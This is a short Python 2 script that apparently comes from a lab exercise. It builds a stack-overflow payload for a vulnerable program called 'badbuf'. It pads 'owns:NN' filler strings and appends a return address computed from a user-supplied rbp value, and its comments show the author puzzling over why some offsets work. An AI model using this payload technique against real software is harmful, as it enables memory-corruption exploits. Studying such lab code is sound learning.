#!/usr/bin/python

# Address of the good string
#
# From `disassemble main` inside `gdb badbuf`
#
# with new lines:
# bytes = [0x49,0x66,0x64]
# without new lines:
def hexify(n):
  a = '%x' % n
  bytes = [ a[i:i+2] for i in range(0,len(a),2) ]
  return map(lambda bs: int(bs,16), bytes)

def own(n):
  return 'owns:%02i\0' % n

def owns(a,b):
  return ''.join(map(own,range(a,b)))

def main(rbp):
  # ??? THIS MAKES NO SENSE ???
  #
  # With delta = 0x08 we get 'owns:17', and with delta = -0x08 we get
  # 'owns:15', but with delta = 0x00 we get nothing.  The problem is
  # *not* that the rbp ends with zero: e.g., with delta = +/-0x10 we
  # get 'owns:18'/'owns:14'.
  delta = 0x08
  bytes = hexify(rbp - 144 + delta)

  # name
  print (owns(16,32) + ''.join(map(chr,reversed(bytes))))
  # pw
  print owns(0,16)

if __name__ == '__main__':
  rbp = int(raw_input(), 16)
  main(rbp)
